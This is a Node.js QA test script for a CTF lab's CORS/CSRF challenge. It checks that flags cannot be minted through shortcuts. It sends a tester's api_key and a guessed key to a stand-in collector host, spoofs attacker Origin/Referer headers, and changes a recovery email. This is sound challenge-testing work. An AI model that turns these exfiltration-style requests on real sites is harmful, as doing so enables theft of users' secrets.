#!/usr/bin/env node
/*
 * VLH-CTF QA SHORTCUT suite — ASLV M2 (aslv-portal), FR-14.
 *
 * Event-verified flags must NOT be mintable without the real win state:
 *   - /api/secret unauthenticated → 401 (no secret, no flag)
 *   - exfiltrating the ATTACKER'S OWN api_key (or a guessed payload) with a
 *     perfect cross-site context → dual check must fail on secret-match
 *   - changing the CALLER'S OWN recovery email → CSRF check must fail (the
 *     checker inspects only the innocent row)
 *
 * "Already minted" (a previous intended-path run against the same lab) is
 * reported as a WARN and not counted as a leak — restart the lab to re-verify
 * shortcut placement from a clean boot.
 *
 * Exit 0 = no shortcut leak. Exit 1 = leak / broken prerequisite.
 * Env: M2_URL (default http://localhost:18022).
 */
import http from 'node:http';

const M2_URL = process.env.M2_URL || 'http://localhost:18022';
const BASE = new URL(M2_URL);
const PORT = Number(BASE.port || 80);
const HOSTS = {
  victim: `victim.aslv.lab:${PORT}`,
  attacker: `attacker.aslv.lab:${PORT}`,
  collector: `collector.aslv.lab:${PORT}`,
};
const FLAG_RE = /ASLV\{(?:CORS|CSRF)-\d{9,10}\}/;

const log = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const die = (m) => { console.error(`[-] ${m}`); process.exit(1); };
const warn = (m) => console.log(`[!] ${m}`);

function request(method, path, { host, headers = {}, body, jar } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null
      : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { ...headers };
    if (host) h.host = host;
    if (payload !== null && !h['content-type']) h['content-type'] = 'application/json';
    if (jar && jar.size) h.cookie = [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
    const req = http.request(
      { host: BASE.hostname, port: PORT, path, method, headers: h },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          if (jar) {
            for (const c of res.headers['set-cookie'] || []) {
              const m = /([^=;]+)=([^;]*)/.exec(c);
              if (m) jar.set(m[1].trim(), m[2]);
            }
          }
          const text = Buffer.concat(chunks).toString('utf8');
          let json = null;
          try { json = JSON.parse(text); } catch (_) { /* html */ }
          resolve({ status: res.statusCode, headers: res.headers, text, json });
        });
      },
    );
    req.setTimeout(5000, () => req.destroy(new Error(`request timeout: ${method} ${path}`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

let leaks = 0;
let preminted = false; // a previous intended-path run already minted flags
function expectNoFlag(label, res) {
  const m = FLAG_RE.exec(res.text);
  if (m) {
    console.error(`[-] SHORTCUT LEAK: ${label} returned ${m[0]}`);
    leaks += 1;
    return false;
  }
  ok(`${label}: no flag (status ${res.status}) — correct`);
  return true;
}

/* /verify evaluation: distinguishes a real dual-check failure from a previous
 * intended-path mint. Returns "blocked" | "leak" | "preminted". */
function evalVerify(label, res) {
  if (res.status !== 200) { console.error(`[-] ${label}: unexpected status ${res.status} ${res.text.slice(0, 200)}`); leaks += 1; return 'leak'; }
  const j = res.json || {};
  if (j.verified && j.flag && FLAG_RE.test(j.flag)) {
    if (String(j.reason || '').includes('already minted')) {
      preminted = true;
      warn(`${label}: flag already minted by a previous intended-path run — restart the lab to re-verify this shortcut cleanly`);
      return 'preminted';
    }
    console.error(`[-] SHORTCUT LEAK: ${label} minted ${j.flag} (reason: ${j.reason})`);
    leaks += 1;
    return 'leak';
  }
  ok(`${label}: not verified (reason: ${j.reason || 'none'}) — correct`);
  return 'blocked';
}

async function main() {
  log(`M2 shortcut target: ${M2_URL}`);

  /* 1. unauthenticated /api/secret — no session, no secret, no flag */
  expectNoFlag('unauthenticated GET /api/secret', await request('GET', '/api/secret', { host: HOSTS.victim, headers: { origin: `http://attacker.aslv.lab:${PORT}` } }));

  /* 2. login as the known tester */
  const jar = new Map();
  const login = await request('POST', '/login', {
    host: HOSTS.victim, jar,
    headers: { accept: 'application/json' },
    body: { username: '0xnhsec', password: 'vlh-tester-01' },
  });
  if (login.status !== 200 || !login.json?.ok) die(`tester login failed: ${login.status} ${login.text.slice(0, 200)}`);
  ok(`logged in as ${login.json.username}`);

  /* reading /api/secret as the TESTER (own session) must not leak a flag */
  expectNoFlag('tester-session GET /api/secret (own api_key)', await request('GET', '/api/secret', { host: HOSTS.victim, jar }));

  /* 3. exfiltrate the ATTACKER'S OWN api_key with a perfect cross-site
   * context — the dual check must fail on secret-match (the verifier binds to
   * the INNOCENT's session-bound secret). */
  const secret = await request('GET', '/api/secret', { host: HOSTS.victim, jar });
  const ownKey = secret.json?.api_key;
  if (!ownKey) die(`could not read own api_key from /api/secret: ${secret.status} ${secret.text.slice(0, 200)}`);
  const exfil = await request('POST', '/collect', {
    host: HOSTS.collector,
    headers: { origin: `http://attacker.aslv.lab:${PORT}`, referer: `http://attacker.aslv.lab:${PORT}/x.html` },
    body: { payload: JSON.stringify({ username: '0xnhsec', api_key: ownKey, balance: 0 }) },
  });
  if (exfil.status !== 200) die(`POST /collect failed: ${exfil.status} ${exfil.text.slice(0, 200)}`);
  evalVerify('verify CORS after exfiltrating the TESTER api_key', await request('GET', '/verify?category=CORS', { host: HOSTS.collector }));

  /* 4. guessed payload (no real secret) with cross-site context */
  await request('POST', '/exfil', {
    host: HOSTS.collector,
    headers: { origin: `http://attacker.aslv.lab:${PORT}` },
    body: { payload: 'usr_guess api_key=deadbeefdeadbeefdeadbeefdeadbeef' },
  });
  evalVerify('verify CORS after exfiltrating a GUESSED payload', await request('GET', '/verify?category=CORS', { host: HOSTS.collector }));

  /* 5. change the CALLER'S OWN recovery email — the CSRF checker inspects
   * only the innocent row, so no state change must be observed. */
  const own = await request('POST', '/account/recovery-email', {
    host: HOSTS.victim, jar,
    body: { email: 'shortcut-self@example.net' },
  });
  if (own.status !== 200) die(`own recovery-email POST failed: ${own.status} ${own.text.slice(0, 200)}`);
  evalVerify('verify CSRF after changing the TESTER\'s own recovery email', await request('GET', '/verify?category=CSRF', { host: HOSTS.collector }));

  /* 6. the attacker vhost never carries flags; the verifier's no-category
   * summary may legitimately echo flags that were ALREADY minted by a
   * previous intended-path run (that is its player-facing purpose) — a flag
   * there WITHOUT any preminted state would be a real leak. */
  expectNoFlag('attacker vhost GET /', await request('GET', '/', { host: HOSTS.attacker }));
  const summary = await request('GET', '/verify', { host: HOSTS.collector });
  const summaryFlag = FLAG_RE.exec(summary.text)?.[0];
  if (summaryFlag) {
    if (preminted) {
      warn(`collector GET /verify echoes ${summaryFlag} — already minted by a previous intended-path run (by design; restart the lab to re-verify)`);
    } else {
      console.error(`[-] SHORTCUT LEAK: collector GET /verify (no category) returned ${summaryFlag} with NO prior mint`);
      leaks += 1;
    }
  } else {
    ok('collector vhost GET /verify (no category): no flag — correct');
  }

  if (leaks > 0) {
    console.error(`\n=== M2 shortcut suite: ${leaks} LEAK(S) — placement bug! ===`);
    process.exit(1);
  }
  console.log('\n=== M2 shortcut suite: no leaks — dual checks hold ===');
  process.exit(0);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND')) {
    die(`cannot connect to ${M2_URL} (${e.code}) — is the m2 profile running?  docker compose --profile m2 up -d`);
  }
  die(`unexpected error: ${e && e.stack ? e.stack : e}`);
});
